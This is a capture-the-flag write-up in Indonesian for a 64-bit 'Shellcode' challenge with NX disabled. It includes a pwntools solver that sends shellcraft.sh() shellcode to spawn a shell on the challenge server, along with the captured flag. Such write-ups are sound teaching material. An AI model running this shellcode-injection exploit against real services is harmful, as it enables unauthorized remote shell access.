# Shellcode 
> Could you execute some shell on this shellcode tester app with no restriction?
```console
nc 103.167.136.89 10023
```

1. Pada challenge ini diberikan sebuah binary file dengan arsitektur 64 bit dan tidak di strip.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/6423a7a3-79ba-4d31-90bd-b1e72addda3f)


2. Langsung saja kita cek binary protectionnya:

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/33a6c627-48bc-4c42-8efb-16496abb2899)


3. Hal yang unik disini, kali ini NX disabled yang berarti arbitrary code yang kita masukan dapat tereksekusi di stack, dengan demikian kita bisa melakukan shellcode injection.
4. Langsung saja kita decompile file binary untuk mengidentifikasi kerentanan:


> Fungsi main()

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/1d8152e9-7660-45c6-8d7a-cfcf6984e370)


5. Tidak ditemukan adanay bufferoverflow pada fungsi main(), akan tetapi input user diterima ke dalam stack (stdin).

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/661b0313-754a-482b-86e7-cc6169e86fb2)


6. Seharusnya space pada stack cukup untuk memasukan shellcode, daripada mencari shellcode untuk spawn shell melalui website -> shell-storm.org.
7. Saya menggunakan shellcraft.sh() yang tersedia di pwntools.
8. Berikut adalah solver yang saya gunakan:

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

sh.sendlineafter(b':', asm(shellcraft.sh()))
sh.interactive()
```

9. Langsung saja kita test secara lokal:

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/80b9a8a9-2722-4cc8-9255-0091c3584caf)


10. Shell berhasil di dapat, langsung saja kita send script remotely.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/7a3b8740-7800-4c89-b02a-198e8264a90d)

Flag yang didapat :
```console
ForestyHC{first_time_write_ur_own_shellcode?_92fab2}
```
